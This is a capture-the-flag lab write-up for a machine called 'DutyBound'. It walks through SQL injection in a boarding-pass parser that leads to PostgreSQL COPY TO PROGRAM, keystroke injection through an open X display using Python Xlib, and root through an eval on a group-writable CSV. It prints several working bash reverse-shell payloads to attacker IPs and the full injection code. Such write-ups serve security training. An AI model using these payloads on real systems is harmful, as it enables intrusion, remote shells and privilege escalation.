# DutyBound

<img width="1588" height="277" alt="image" src="https://github.com/user-attachments/assets/32aabc2f-238e-4a61-8ac6-a011e88c9a98" />

----


## port scan 

```
nmap -sC -sV 10.129.50.229 -Pn
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-31 19:17 UTC
Nmap scan report for 10.129.9.228
Host is up (0.36s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=airsnacks.htb
| Not valid before: 2026-08-26T08:17:18
|_Not valid after:  2126-08-02T08:17:18
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.14 seconds

```


---

## Explore the application

```
echo "10.129.50.229 airsnacks.htb" | sudo tee -a /etc/hosts
```

<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/54c66704-68b2-4841-bb91-19bf2f553bbd" />


---

## enumrate endpoints 

```
feroxbuster -u https://airsnacks.htb -k \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak
```


<img width="1415" height="406" alt="image" src="https://github.com/user-attachments/assets/a585a76f-97c1-4165-96cc-3009769d8cd7" />



**What I found:**

- `/cart/add`
    
- `/checkout`
    
- `/checkout/boarding-pass`
    
- `/checkout/boarding-pass/verify` ← accepts JSON with a `raw` BCBP string
    

**Note:** `/checkout/boarding-pass/verify` takes structured text (BCBP) and parses it. Parsers are where injection lives. That's our entry point.


<img width="1919" height="698" alt="image" src="https://github.com/user-attachments/assets/60702ff0-3fd9-489a-baad-3404e9a0bdfb" />


----

## when click `scan boarding pass` it send json to **`/checkout/boarding-pass/verify`** and response with 

<img width="1559" height="360" alt="image" src="https://github.com/user-attachments/assets/2201d211-838f-4fe3-bd80-32e64cb2a566" />


---

## What the error tells us

```json
{"detail": "expected 'M' at offset 0", "error": "BCBP_ERR_FORMAT_CODE", "item": 1}
```


- **offset 0** — the parser is 0-indexed and checks position 0 first.
    
- **expected 'M'** — the first character must be `M` (BCBP format code, "M" = mandatory single-leg).
    
- **item 1** — this is field/item #1 in its internal model.

---

## let's send it again with **`M`**

<img width="1646" height="412" alt="image" src="https://github.com/user-attachments/assets/2fc33f3c-26c2-4357-b7c1-dfc8cd439c97" />

> ### **What this means:** the parser does _not_ check character-by-character from offset 0. It reads fixed-size fields by position, and at **item 6** it needs the total string length to be at least **60 characters**. The `M` alone satisfied items 1–5, but then it tried to read item 6 (which is a fixed-size block) and ran out of string.

So the "append what it asks for" oracle won't work here — there's no `expected 'X' at offset N` to follow. Instead we need to know **the fixed layout of the first 60 bytes**.

----

## The BCBP layout : 



Standard IATA BCBP (which this parser implements) with `M` (mandatory single-leg) format code:

| Field                        | Offset | Length | our value          |
| ---------------------------- | ------ | ------ | ------------------- |
| Format Code                  | 0      | 1      | `M`                 |
| Number of Legs               | 1      | 1      | `1`                 |
| Passenger Name               | 2      | 20     | `DOE/JOHN` + spaces |
| Electronic Ticket Indicator  | 22     | 1      | `E`                 |
| Operating Carrier PNR        | 23     | 7      | `ABC123`            |
| From Airport                 | 30     | 3      | `HTB`               |
| To Airport                   | 33     | 3      | `JFK`               |
| Operating Carrier            | 36     | 3      | `BA`                |
| Flight Number                | 39     | 5      | `0123`              |
| Julian Date                  | 44     | 3      | `297`               |
| Compartment                  | 47     | 1      | `Y`                 |
| Seat Number                  | 48     | 4      | `001A`              |
| Check-in Sequence            | 52     | 5      | `0001`              |
| Passenger Status             | 57     | 1      | `A`                 |
| Field Size of Variable Field | 58     | 2      | `16` (hex)          |


The exact string the exploit uses (confirmed by the machine's parser) is:


```text

M1DOE/JOHN            EABC123 HTBJFKBA 0123 297Y001A0001A16F>50B0WW6297BBA 03123
```

Counting:

- `M1` (2)
    
- `DOE/JOHN` + 12 spaces = 20 (total 22)
    
- `E` (23)
    
- `ABC123` (7 chars, with trailing space) = 30
    
- `HTB` (33)
    
- `JFK` (36)
    
- `BA` (38)
    
- `0123` (42)
    
- `297` (45)
    
- `Y` (46)
    
- `001` (49)
    
- `A0001` (5 chars: `A` + `0001` sequence) = 54
    
- `A` (55)
    
- `16` (57) — item 14, field size of item 18 in hex = 0x16 = 22 bytes
    
- `F>50B0WW6297BBA 03123` (22 chars) = 79
    

That's 79 total. The parser's "needs ≥ 60" at item 6 is satisfied because by item 6 it has read 30 chars and is now reading fixed fields — but the _total_ must be ≥60 for it to get past its length check. So any string that's ≥60 chars and has a valid item 1–5 will get past this error.


<img width="1560" height="410" alt="image" src="https://github.com/user-attachments/assets/25192d1e-847b-4ba0-b889-12ae91fdc80a" />


- **`audit_ref`** — the server wrote a row to `bp_scan_audit`. That means our string was parsed and **inserted into the database**. This is the table the SQLi will target.
    
- **`dest: "JFK"`** — confirms the parser read our `JFK` at the "to airport" offset correctly. our field boundaries are right.
    
- **`eligibility_token`** 
    
- **`exempt: true`** — the checkout logic accepted the pass.



> [**Reference Source**](https://www.iata.org/contentassets/1dccc9ed041b4f3bbdcf8ee8682e75c4/2021_03_02-bcbp-implementation-guide-version-7-.pdf): BCBP is a standardized format, not a random string. I identified it as an IATA BCBP boarding pass based on the error codes `BCBP_ERR_*` returned by the server and consulted IATA Resolution 792 (Bar Coded Boarding Pass) . The mandatory section contains 60 characters with a fixed field order (Format Code, Number of Legs, Passenger Name, etc.) .




----



## idintify SQLI 

add ` ' ` at end we got **`500 INTERNAL SERVER ERROR`**

```
{"raw": "M1DOE/JOHN            EABC123 HTBJFKBA 0123 297Y001A0001A16F>50B0WW6297BBA 03123'"}
```

<img width="1602" height="331" alt="image" src="https://github.com/user-attachments/assets/07113314-962a-43ed-a93a-1f6d3abed56a" />



---

## What the error tells us


```
"detail": "unterminated quoted string at or near \"''')\"\nLINE 1: ...E/JOHN', 'BA', '0123', '297', 'HTB', 'JFK', '', '', 81, ''')"
```



1. **`LINE 1: ...`** — the server is echoing the SQL it tried to run. we can see the column values it extracted from our BCBP string:
    
    - `'DOE/JOHN'` — passenger name (our field, correctly parsed)
        
    - `'BA'` — operating carrier
        
    - `'0123'` — flight number
        
    - `'297'` — Julian date
        
    - `'HTB'` — from airport
        
    - `'JFK'` — to airport
        
    - `'', ''` — two empty fields (probably `compartment` and `seat`, or similar)
        
    - `81` — an integer (probably a row ID or sequence)
        
    - `''')` — **this is where our input lands**
        
2. **`''')`** — this is the tail of the INSERT. The structure is:
    
    ```sql
    
    INSERT INTO bp_scan_audit (..., airline_use) VALUES (..., ''')

    ```
    
    our `'` closed the string literal, then `'')` is the original query's closing. The parser/DB sees `'''` (three quotes in a row) and says "unterminated quoted string."
    
3. **`DCS_ERR_INTERNAL`** — a generic error wrapper. But the `detail` field leaks the raw PostgreSQL error. That's the injection confirmation.


```
VALUES (..., 'INPUT')     -- original
VALUES (..., 'INPUT'')    -- with our single quote
VALUES (..., '...03123''') -- what the DB sees
```


----

## How to turn this into command execution


Now that we know:

1. The query is `INSERT INTO bp_scan_audit (...) VALUES (..., '<input>')`
    
2. PostgreSQL errors are returned
    
3. The app's DB role has `pg_execute_server_program` (we'll confirm this with the `COPY TO PROGRAM` attempt)

    "If the role lacked this privilege, `COPY TO PROGRAM` would return `permission denied to COPY to or from an external program`. A 200/500 with no permission error confirms the role has it."
   

we construct a payload that:

1. **Closes** the string literal: `'`
    
2. **Closes** the INSERT statement: `);`
    
3. **Adds** a new statement: `COPY (SELECT '') TO PROGRAM '...'`
    
4. **Comments out** the rest: `--`
    

The full payload:

```text

M1DOE/JOHN            EABC123 HTBJFKBA 0123 297Y001A0001A16F>50B0WW6297BBA 03123'); COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.34/4444 0>&1"'; --
```

This becomes:

```sql

INSERT INTO bp_scan_audit (..., airline_use) VALUES (..., '...03123'); COPY (SELECT '') TO PROGRAM 'bash -c "..."'; --')
```


<img width="1901" height="458" alt="image" src="https://github.com/user-attachments/assets/d30f1494-c1f4-4fbe-ba6f-8fda15205c1b" />


---

## privesc


```
id
env
ls /home
```

<img width="1167" height="478" alt="image" src="https://github.com/user-attachments/assets/481c62f1-6010-4771-9937-c8b867102d03" />

> enumeration of the users reveals another user with a shell and a home dir, `dutyfree-kiosk`. so that's probably the user we want to attack.

> however we may have to go through `airsnacksdf` first, which is the user running the webapp, whose source code we can now read in `/opt/vrs/airsnacksdf`

> there are also some other scripts int `/opt/vrs` which may be of interest

<img width="762" height="96" alt="image" src="https://github.com/user-attachments/assets/e5dad342-8390-4ea6-a56d-48c35e7f8225" />


---

## the script `/opt/vrs/bin/apply-duty-rates.sh` has some content:


```
RATES="/opt/vrs/data/duty-rates.csv"
# ...
while IFS=, read -r tax_class duty_pct vat_pct; do
    # ...
    eval "${tax_class}=${duty_pct}"

done < "$RATES"
# ...
```

> and that csv file can be written by the group `pos-ops`, which dutyfree-kiosk is a member of. so once we get to that user, we will be able to inject commands.


> the script runs as root when that csv file is modified. that is because there is a systemd service for it vrs-duty-apply.service and vrs-duty-apply.path

---

```
cd /opt/vrs/data/
cat duty-rates.csv
```

<img width="1010" height="304" alt="image" src="https://github.com/user-attachments/assets/cc3a6dd9-d65d-4fd5-bdfc-f054ba47ff68" />

> eeping that in the back pocket for now...

---

```
ps aux 
```

```
dutyfre+    1722  ... /lib/systemd/systemd --user
dutyfre+    1730  ... /bin/sh /usr/bin/xinit ...
dutyfre+    1759  ... xinit /home/dutyfree-kiosk/...
root        1760  ... /usr/lib/xorg/Xorg :0 ...
dutyfre+    1771  ... /usr/bin/openbox ...
dutyfre+    1774  ... /snap/firefox/firefox ...
```

---

### 1. `Xorg` — the X server

```text

root        1760  0.0  1.9 522548 76940 tty7     Sl   19:16   0:02 /usr/lib/xorg/Xorg :0 ...
```

- **`:0`** — the display number is right there in the command line. **This is how you know it's `:0`** — you don't guess, you read it from `ps aux`.
    
- **`root`** — Xorg runs as root (normal; it drops privileges per-client, but the server itself needs root for device access).


> "The X server is running on :0 (visible in the Xorg :0 command line), attached to tty7 — the standard graphical VT on Linux. This is the display I will target."


> ### X Server as the "screen manager" for Linux graphical sessions. It is the program that actually draws windows on the monitor, receives your keyboard and mouse input, and tells applications "here is where you should draw."


On DutyBound, the X Server is called `Xorg`, and it is running on **display `:0`**. we saw this in `ps aux`:

```text

root  1760  ... /usr/lib/xorg/Xorg :0 ...
```

The `:0` is the display number. The kiosk user (`dutyfree-kiosk`) is using this X Server to run Firefox and Openbox (the window manager).


---

### 2. `openbox` — the window manager

```text

dutyfre+    1771  ... /usr/bin/openbox ...
```

- **`dutyfre+`** — runs as kiosk.
    
- **`openbox`** — the WM that owns the keyboard shortcuts. **This is  tells us Ctrl+Alt+T will work.** Without Openbox, keyboard shortcuts do nothing; X just passes raw key events to the focused window.
    

**For the writeup:** "Openbox runs as `dutyfree-kiosk` and manages the kiosk session. Openbox's default `rc.xml` binds `Ctrl+Alt+T` to `xterm`. Because the WM belongs to the kiosk user, any terminal spawned by that binding runs as `dutyfree-kiosk`."


---


### 3. `firefox` — the foreground application

```text

dutyfre+    1774  ... /snap/firefox/firefox ...
```

- **`dutyfre+`** — runs as kiosk.
    
- **`firefox`** — the kiosk app, which almost certainly has **input focus** (it's the window the user is "looking at").





    
---



| Fact                              | Evidence                                     | Consequence                                      |
| --------------------------------- | -------------------------------------------- | ------------------------------------------------ |
| X server on `:0`                  | `Xorg :0` in `ps`                            | Target `DISPLAY=:0`                              |
| Session owned by `dutyfree-kiosk` | `xinit`, `openbox`, `firefox` all `dutyfre+` | Any process spawned by the session runs as kiosk |
| Openbox is running                | `openbox` PID 1771                           | Ctrl+Alt+T binding is active                     |
| Firefox has focus                 | It's the foreground app                      | Naive XTEST typing fails; need explicit focus    |
| X runs as root                    | `Xorg` owner is `root`                       | If `xhost +` is set, any local user can connect  |




## How We Got the Shell as dutyfree-kiosk



1. **The X Server is open to anyone.** Because of `xhost +`, your `postgres` user can send commands to the kiosk's graphical session.
    
2. **We injected `Ctrl+Alt+T`.** We used a Python library called `XTEST` to send a fake keypress to the X Server. `XTEST` lets you simulate keyboard and mouse events as if a real person pressed them. We sent: "Press Control, press Alt, press T."[](http://pike.roxen.se/generated/manual/modref/ex/predef_3A_3A/Protocols/X/Extensions/XTEST/XTestFakeInput.html#XTestFakeInput)
    
3. **Openbox received the shortcut.** Openbox is the window manager running as `dutyfree-kiosk`. Your `/etc/xdg/openbox/rc.xml` file shows the binding:
    
  ```  xml
    
    <keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
  ```
  
  So Openbox said: "Ctrl+Alt+T means run `xterm`." Because Openbox is running as `dutyfree-kiosk`, the `xterm` it spawned also ran as `dutyfree-kiosk`.
    
4. **The xterm opened, but Firefox had focus.** Here is the tricky part. `XTEST` sends keystrokes to the **currently focused window**. Firefox was in focus, so if we just typed, the text would go to Firefox, not our new xterm.
    
5. **We forced focus onto the xterm.** We found the xterm's window by its PID (`_NET_WM_PID`), and used `set_input_focus` to tell the X Server: "Give keyboard focus to this window". This is what `xdotool windowactivate` does, but `xdotool` was blocked on this box.[](https://deepwiki.com/python-xlib/python-xlib/4.6-input-grabs-and-focus#1)
    
6. **We typed the command.** Once the xterm had focus, we typed `/tmp/rs.sh` and pressed Enter. The xterm (running as `dutyfree-kiosk`) executed the script, and the script connected back to your Kali listener on port 4447.





----

## A — Verify X access

```
DISPLAY=:0 xdpyinfo | head -3
```


<img width="992" height="137" alt="image" src="https://github.com/user-attachments/assets/38c7df76-8bca-4e09-adb9-17d41178793b" />

> we can reach `:0` without an auth cookie.
> Normally, the X Server is **locked down**. It uses a "cookie" (a secret file called `.Xauthority`) to check: "Are you the user who owns this session? If not, go away." This is the MIT-MAGIC-COOKIE-1 mechanism.[](http://man.openbsd.com/Xsecurity.7)

>But on DutyBound, someone ran **`xhost +`**. This command tells the X Server: "Disable all access checks. Let anyone connect." The manual page for `xhost` warns: _"This disables host access checking and thus allows everyone to connect. You should never do this on a network on which you don't trust all users."_

>That is the vulnerability. When you ran `DISPLAY=:0 xdpyinfo`, you were saying: "Hey X Server at `:0`, can I talk to you?" And because `xhost +` was set, it answered: **"Yes, here is my info."** You didn't need the kiosk user's cookie.

---

## Spawn the kiosk xterm via Ctrl+Alt+T


```
DISPLAY=:0 python3 -c "
from Xlib import X, XK, display
from Xlib.ext import xtest
import time
d = display.Display()
c = d.keysym_to_keycode(XK.string_to_keysym('Control_L'))
a = d.keysym_to_keycode(XK.string_to_keysym('Alt_L'))
t = d.keysym_to_keycode(XK.string_to_keysym('t'))
for k in (c,a,t): xtest.fake_input(d, X.KeyPress, k)
d.sync(); time.sleep(0.2)
for k in (t,a,c): xtest.fake_input(d, X.KeyRelease, k)
d.sync()
"
```


**`then check`**

```
ps -eo pid,user,comm | grep -i xterm
```

<img width="806" height="92" alt="image" src="https://github.com/user-attachments/assets/b2274b5f-e5d5-4ed6-9c44-a659b305d37c" />


----


## Write `/tmp/rs.sh`

```
printf '%s\n' 'bash -i >& /dev/tcp/10.10.16.220/4447 0>&1' > /tmp/rs.sh
chmod 777 /tmp/rs.sh
```


---

## Deploy the focus-and-type script

```
cat > /tmp/ft.py << 'PYEOF'
#!/usr/bin/env python3
import sys, time
from Xlib import X, XK, display
from Xlib.ext import xtest

pid = int(sys.argv[1]); text = sys.argv[2]
d = display.Display(); root = d.screen().root

def find(w):
    try:
        p = w.get_full_property(d.intern_atom('_NET_WM_PID'), X.AnyPropertyType)
        if p and p.value[0] == pid: return w
    except Exception: pass
    try:
        for c in w.query_tree().children:
            r = find(c)
            if r: return r
    except Exception: pass
    return None

w = find(root)
if not w:
    print("window not found"); sys.exit(2)
print("found window for pid", pid)
w.configure(stack_mode=X.Above)
w.set_input_focus(X.RevertToParent, X.CurrentTime)
d.sync(); time.sleep(0.5)

for ch in text:
    ks = XK.string_to_keysym(ch) or ord(ch)
    kc = d.keysym_to_keycode(ks)
    if kc:
        xtest.fake_input(d, X.KeyPress, kc)
        xtest.fake_input(d, X.KeyRelease, kc)
        d.sync(); time.sleep(0.04)

r = d.keysym_to_keycode(XK.string_to_keysym('Return'))
xtest.fake_input(d, X.KeyPress, r); xtest.fake_input(d, X.KeyRelease, r); d.sync()
print("done")
PYEOF
chmod 777 /tmp/ft.py
```


---

## Focus PID 3678 and type /tmp/rs.sh

```
DISPLAY=:0 python3 /tmp/ft.py 3678 /tmp/rs.sh
```

<img width="1045" height="90" alt="image" src="https://github.com/user-attachments/assets/aae19f25-deb8-4782-922f-a0ff79e53f2a" />

<img width="1088" height="155" alt="image" src="https://github.com/user-attachments/assets/5ac1a71f-6162-4ecb-9a8c-6976ec8e3134" />

---


## privesc to root 

> ### as we saw before, the path to root has to do with the custom csv ingestion script in /opt/vrs


```
 eval "${tax_class}=${duty_pct}"
```

> #### those variables come from the first two fields in the csv, which we already discovered we have write access to. and due to the systemd file-watcher service or whatever it's really called, any edits we make to that csv will automatically trigger this script as root.


```
ls -la /opt/vrs/data/duty-rates.csv
```

<img width="778" height="76" alt="image" src="https://github.com/user-attachments/assets/3c5f9da6-27f7-4e73-a009-dd7806715ff4" />

> The key is 1001(pos-ops) in your groups and root pos-ops ownership. Group-writable = you can append.

---


## Confirm the trigger service

```
systemctl list-unit-files | grep -i vrs
systemctl cat vrs-rates.service 2>/dev/null | grep -E 'Type|ExecStart|User'
```

<img width="1142" height="157" alt="image" src="https://github.com/user-attachments/assets/7ed25cc4-2e55-4194-9906-ea20d58b4f61" />

## Append the payload and trigger


```
printf '%s\n' '`bash -i >& /dev/tcp/10.10.16.220/4446 0>&1`,45,20' >> /opt/vrs/data/duty-rates.csv
touch /opt/vrs/data/duty-rates.csv
tail -3 /opt/vrs/data/duty-rates.csv
```

```
nc -lnvp 4446
```


<img width="983" height="217" alt="image" src="https://github.com/user-attachments/assets/43d9b17e-0d05-4310-8aad-79f524973d70" />


## What  happened



1. **A file is writable by our group.** `/opt/vrs/data/duty-rates.csv` is owned `root:pos-ops`, mode `775`. we are `dutyfree-kiosk`, in `pos-ops`. So we can append to it.
    
2. **A root service reads that file automatically.** A systemd `.path` unit watches the file; when it changes, it triggers a root-owned oneshot service that runs `/opt/vrs/bin/apply-duty-rates.sh`.
    
3. **That script uses `eval` on unvalidated input.** The first CSV field (`tax_class`) goes straight into `eval "${tax_class}=${duty_pct}"`. Backticks in `tax_class` are executed as a command.
    

our job was to bridge (1) to (3): write a payload the script will `eval` as root.








